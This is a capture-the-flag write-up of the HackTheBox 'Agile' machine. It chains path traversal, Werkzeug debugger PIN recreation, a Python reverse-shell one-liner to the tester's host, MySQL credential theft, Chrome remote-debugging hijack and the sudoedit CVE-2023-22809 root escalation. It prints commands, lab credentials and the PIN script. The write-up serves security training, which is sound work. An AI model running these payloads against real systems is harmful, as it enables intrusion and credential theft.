---
title: "HackTheBox - Agile"
date: 2023-08-05T09:04:19-05:00
tags: ["Arbitrary File Read","Werkzeug","Python","sudo"]
description: "Agile is a medium difficulty box presented as an online password manager. By abusing unsanitized user input in the service's download funcion to access system files, in combination with overly verbose error messages, we are able to replicate the Python Werkzeug's debugger PIN number and achieve remote code execution as www-data. With shell access we can find one user's credentials in the mysql database, followed by another user's credentials after hijacking a google chrome session with the --remote-debugging-port flag set. By abusing a sudoedit vulnerability, we are able to edit a script frequently run by the root user, allowing us to take actions as root, leading to full root access."
image: "Agile.png"
categories: ["Hack The Box"]
---
## Enumeration
Initial nmap:
```bash
# Nmap 7.92 scan initiated Sat Mar  4 14:42:58 2023 as: nmap -sCV -A -oN nmap_init.txt 10.129.27.120
Nmap scan report for 10.129.27.120
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  4 14:43:10 2023 -- 1 IP address (1 host up) scanned in 11.87 seconds
```

Aside from credential-locked `ssh`, port, we only see http port 80 open. The nmap shows that we will be redirected to http://sueprpass.htb, so we must add this to our /etc/hosts file in order to properly visit:

```bash
$ tail /etc/hosts

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.203 superpass.htb
```

We see superpass as a super password manager:

![Home Page](SuperpassHomepage.png)

Trying to login with generic credentials does not succeed, but we are able to register an account, `asdf:asdf`

![asdf registration](Register.png)

We see a vault where we can begin to generate passwords, and label them with sites/usernames. 

![Add a password](PassGen.png)

The export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.

We can see upon clicking `Export` we are sent to the url http://superpass.htb/vault/export on a GET request:

![No password error](NoPass.png)

An interesting finding at this point, we see that `superpass.htb` server
is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in `404 Not Found`. We will eventually learn that this service is running from Flask, although it wasn't apparent at first glance if you didn't run into the common SQLAlchemy error.

Since we didn't click the save icon when generating out password, it seems like our database is still empty.

Once we add a password, we can see the call redirects to a custom url, `download?fn=asdf_export_49adcafaf8.csv`. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:

![Burpsuite Export](Export.png)

### Arbitrary file read in `/download`

In a simpler approach, we can check if we are able to reference any file by specifying the path:
`http://superpass.htb/download?fn=../../../../../../../etc/passwd`

Upon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:

![/etc/passwd](etc_passwd.png)


In this file we can see 4 user accounts:
```bash
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from `/tmp/` and the flask SECRET is also displayed:

![Flask Error](Error.png)
Note, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or `curl`:

```html
   <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "tDxE1kBphctDjlZ1DvYf";
    </script>
```

The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this `download` vulnerability.

![Vault Views](Vault_views.png)

From here, we can enumerate all or most of the python source files by watching the imports. For example, `from superpass.services.utility_service import get_random` tells us that there is a python file accessible at `/app/app/superpass/services/utility_service.py`. We can also determine that the main `app.py` file will be located at `/app/app/superpass/app.py`, based on where the import path is starting.

### Unsuccessful Foothold Attempts
#### Recreating export.csv

My first thought is to see how the export is behaving. Since we have a list of usernames on the machine, perhaps we can recall an export.csv that they have previously generated?
I find my answer in
`/app/app/superpass/views/services/password_service.py`:
```python
def generate_csv(user):

    rand = get_random(10)
    fn = f'{user.username}_export_{rand}.csv'
    path = f'/tmp/{fn}'

    header = ['Site', 'Username', 'Password']
    
    session = db_session.create_session()
    passwords = session.query(Password) \
        .filter(Password.user_id == user.id) \
        .all()
    session.close()

    with open(path, 'w') as f:
        writer = csv.writer(f)
        writer.writerow(header)
        writer.writerows((p.get_dict().values() for p in passwords))
```

It looks like the numbers appended are from get_random, defined in `/app/app/superpass/services/utility_service.py`:
```python
import datetime
import hashlib

def get_random(chars=20):
    return hashlib.md5(str(datetime.datetime.now()).encode() + b"SeCReT?!").hexdigest()[:chars]
```

It includes a time variable which we have no way of knowing. Essentially, it is technically possible to try to brute force potential exports by guessing every possible combination of 10 characters. But this can be considered a last resort, as it is not guaranteed that machine usernames will match the service's account names, nor guarantee that the user had generated a csv file at all.

#### Forging a flask cookie

My next thought is with the source code available and the flask secret (given through the error), we might try to forge a cookie for a different user.

Starting with our cookie, we can grab it from Burpsuite's request after session=
```
.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c
```

Visiting a [Flask cookie decoder online tool](https://www.kirsle.net/wizards/flask-session.cgi), we can decode without issue into something more readable:

![Flask Decoded](DecodeCookie.png)


```json
{
    "_fresh": true,
    "_id": "733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96",
    "_user_id": "9"
}
```

While the `_id` appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask's secret key. To do so, I utilize the popular tool [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign).

```json
┌──(kali㉿kali)-[~/Documents/Agile]
└─$ cat tosign.txt                                      
{'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '0'}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Agile]
└─$ flask-unsign -s -S 'tDxE1kBphctDjlZ1DvYf' --cookie tosign.txt
InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk
```

Unfortunately, trying to use this cookie resulted in a failure. Presumably, the `_id` hash no longer correlates to `_user_id` value and the cookie session becomes invalid.

#### IDOR access on other user's passwords
When following the request trail involved in editing a password or leaving editor mode, we can see the url activities visiting `/vault/row/<id>` or `/vault/edit_row/<id>`. Additionally, when reviewing the source code, we see a similar check being performed, with seemingly no verification on the user. We can write a quick script to check a number range, or do the same in Burpsuite Intruder option:
```bash
#!/bin/bash
for i in {0..15}  
do  
 curl http://superpass.htb/vault/get/$i --cookie "session=.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmY  
x6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c"  
done
```
This approach was successful on box release, but has since been patched. Apparently it was never an intended approach.

## Foothold
### Recreating Werkzeug's Debugger PIN

Eventually I turn myself to the system's active `debugger` mode. We noticed that this is turned on, since when we requested to download a file that didn't exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:

![Console Option Available](ConsoleOption.png)

However, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.

![PIN requirement](PIN_Ask.png)

There is a [hacktricks article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) covering how we generate a matching PIN number based on some of the system's information. 

We must gather system information utilized to generate the PIN, then we can recreate it locally using the script presented in the article. Each component was a small adventure to get. The final script contained the following information:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'www-data',# username
    'flask.app',# modname
    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052401235',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]
```

- Username as `www-data` is common for linux web services, although python can also be run by users as well. I had been trying combinations with both `www-data` as well as `runner`, as this account seemed like it might have been generated for the sole purpose of running a web server.
- Modname as `flask.app` is the default option provided by Hacktricks, but also we can see this in `app.py`, where it simply states `import flask`.
- `wsgi_app` was the hardest to find, as this variable is not well defined in the article, simply presented as Flask. Under `def enable_debug():` from app.py, we see the debug application referred to as `app.wsgi_app = DebuggedApplication(app.wsgi_app, True)`.
- `/app/venv/lib/python3.10/site-packages/flask/app.py` is given on the error page. 
Private Bits:
- When accessing `/sys/class/net/eth0/address`, we get id 00:50:56:b9:ce:53:

![eth0 address](Address.png)

To convert into the private bit variable, we utilize python to print:
```python
>>> print(0x005056b9ce53)
345052401235
```

- Machine ID is a combination of `/etc/machine-id` and the last section of `/proc/self/cgroup`. Visiting `/etc/machine-id`:

![Machine ID](Machine.png)

Visiting `/proc/self/cgroup`:

![cgroup](cgroup.png)

The combined bit is `ed5b159560f54721827644bc9b220d00superpass.service`

### Remote Code Execution as `www-data`

Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:

![debug active](consoleready.png)

`import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.133",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`

On our listener:

```bash
$ nc -nvlp 8888        
listening on [any] 8888 ...
connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 55440
$ whoami
whoami
www-data
```

We have a shell, but it is still a "dumb" shell. Features such as autocomplete or interactive binaries such as vim will not work well, so we need to stabilize the shell. There are many ways to do this, my favorite being the use of `script`:

```sh
$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
(venv) www-data@agile:/app/app$
```

From here we background the session with ctrl+Z, and type `stty raw -echo; fg`. The fg will put us back into the rev shell session, where we press enter a 2nd time and our shell has been stabilized.

```
(venv) www-data@agile:/app/app$ ^Z
zsh: suspended  nc -nvlp 8888
                                                                                                                                                         
┌──(kali㉿kali)-[~/Documents/Agile]
└─$ stty raw -echo; fg 
[1]  + continued  nc -nvlp 8888

(venv) www-data@agile:/app/app$
```

## Lateral Movement
### Accessing the SQL database

After brief enumeration, I find an interesting json file in the base /app folder containing the SQL credentials:

```
(venv) www-data@agile:/app$ cat config_prod.json 
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```
We see credentials as `superpassuser:dSA6l7q*yIVs$39Ml6ywvgK`. Since our shell has been stabilized, we can call an interactive mysql session. This would have failed if we had tried earlier.
```
(venv) www-data@agile:/app$ mysql -u superpassuser -p                    
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 392
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
Navigating the SQL is rather easy since there isn't much information. The only unique database is `superpass`, and only 2 tables exist:
```
mysql> show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
| 10 | 2023-08-03 15:36:53 | 2023-08-03 15:36:53 |                |          | 7bbe46f078cc431df0c8 |      11 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
6 rows in set (0.00 sec)
```

Recall that on this machine, we saw a user named `corum`? Perhaps the 'agile' url password is referring to this machine. When checking with `su`, we see a success.

```
(venv) www-data@agile:/app$ su corum
Password: 
corum@agile:/app$
```

As great as the stabilized reverse shell is, I happily move to an ssh connection from this point, as port 22 was confirmed open.
```bash
$ ssh corum@superpass.htb
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Thu Aug  3 15:45:18 2023 from 10.10.14.133
corum@agile:~$ ls
user.txt
```

We have finally reached the `user.txt`.

### Hijacking a google chrome session through remote-debugging port

Manual enumeration did not yield anything interesting to me. However, executing `linpeas` showed me a potential route to privilege escalation i was unaware of.

![Chrome session with remote debugging port](RunnerDebugPort.png)

There is a process of google chrome running, and special attention is drawn to the fact that the `--remote-debugging-port` flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what `runner` can access in this webpage. First, we need a way for our local browser to reach the box's port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach

```
$ ssh -L 1080:localhost:41829 corum@superpass.htb
```

To enter the port forwarding page in Google Chrome, in the url segment we type `chrome://inspect/#devices`. Next, we must configure our ports to the right of "Discover network targets"

![Port Forwarding Page](ChromeConfig1.png)

Set the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box's port 41829.

![Setting the address](ChromeConfig2.png)

Now we can see a remote target. Notice the address is at `http://test.superpass.htb`. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.

![Target is now visible and accessible](RemoteTarget.png)

Selecting `inspect` will open a new DevTools tab, where we can interact with the chrome session.

![Interactive Chrome Session in test.superpass.htb](SuperpassTestSession.png)

Selecting the Vault, we see new passwords, this time for `edwards`. This was also a user account name on the machine.

![Ed's Creds](EdCred.png)

Using the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.

```html
     <td>agile</td>
    <td>edwards</td>
    <td>d07867c6267dcb5df0af</td>
```

`edwards:d07867c6267dcb5df0af`

```bash
corum@agile:~$ su edwards
Password: 
edwards@agile:/home/corum$ 
```

## Privilege escalation through `sudo` vulnerability

The `su` is successful, and we now have 1 more user's account to work with. Checking this account's privileges, we see we can perform a `sudo` as dev_admin:

```
edwards@agile:/home/corum$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

This `/app/app-testing/tests/functional/creds.txt` is very desirable based on the name, and is only accessible by dev_admin. Upon running:

```
edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
```

![Ed's Creds 2](EdCred2.png)

We see in a nano editor some more credentials for edwards.

`edwards:1d7ffjwrx#$d6qn!9nndqgde4`

The credentials don't work for any user on the system; perhaps they are utilized for the google chrome debugging session?

Searching for problems with `sudoedit`, I quickly find a very recent CVE, [CVE-2023-22809](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809). This CVE was released in under two months from the time of writing. Affected versions are 1.8.0 through 1.9.12.p1, so first we must check this:

```
edwards@agile:/home/corum$ sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Version 1.9.9 will be before version 1.9.12, so this should be vulnerable! Execution seems very straightforward. If we include extra arguments in environment variables (SUDO_EDITOR, VISUAL, and EDITOR), sudoedit will allow us to edit files not meant to be edited. With this strategy, we can edit any file dev_admin can edit. Looking for interesting targets:

```bash
edwards@agile:/home/corum$ find / -user dev_admin 2>/dev/null
/home/dev_admin
/app/app-testing/tests/functional/creds.txt
/app/config_test.json
/app/config_prod.json
edwards@agile:/home/corum$ find / -group dev_admin 2>/dev/null
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

Using the sudoedit exploit, we should be able to alter any of these files. But how can we really benefit from adding a line or two in some of these files? If there is a regularly running program that takes input from one of these files, we can supply malicious commands for that user to execute. Ideally, if there is a cronjob running as root for regular intervals, we can have root execute some commands for us. We can check for things as they run using pspy. Sending pspy over to the box:
On my local kali, finding where I put pspy:
```
$ locate pspy              
/home/kali/Downloads/pspy64
                                                                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
On the Agile box, downloading and running pspy:
```bash
edwards@agile:/dev/shm$ wget 10.10.14.133/pspy64 && chmod +x pspy64
--2023-08-03 16:52:45--  http://10.10.14.133/pspy64
Connecting to 10.10.14.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                       100%[==============================================>]   2.96M  4.00MB/s    in 0.7s    

2023-08-03 16:52:46 (4.00 MB/s) - ‘pspy64’ saved [3104768/3104768]

edwards@agile:/dev/shm$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
```

After waiting a brief period, we see the root user access one of the files we can control:
```bash
2023/08/03 16:56:01 CMD: UID=0     PID=51843  | /bin/bash -c source /app/venv/bin/activate
```
We can see `activate` being invoked. Using our sudoedit exploit, we can alter this file to communicate back to us through a reverse shell payload.
Setting up our environment variable:
```
edwards@agile:/dev/shm$ export EDITOR="vim -- /app/venv/bin/activate"
```
Now executing our sudoedit command:
```
edwards@agile:/dev/shm$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
```
When we execute we are not editing `creds.txt`. Instead, we see `/app/venv/bin/activate`

![/app/venv/bin/activate in vim](ativate.png)

To ensure our payload runs at the start of this script, I insert the command before the commented lines:

![Malicious Payload](Payload_added.png)

Now after waiting a few seconds, the connection reaches my kali machine:
```bash
$ nc -nvlp 8888           
listening on [any] 8888 ...
connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 60376
bash: cannot set terminal process group (52086): Inappropriate ioctl for device
bash: no job control in this shell
root@agile:~# id 
id
uid=0(root) gid=0(root) groups=0(root)
```

## Reflection
After the IDOR vulnerability had been patched, this box turned out to be quite difficult! It was my first completion on a medium box, and the technique for remotely viewing the chrome process felt very original. While the sudo exploit felt quite simple, I appreciated that it wasn't completely free since only dev_admin's files were accessible. After going through the pain in generating the debugging PIN and sneaking into the google chrome page, it is nice to have a straightforward route to root.
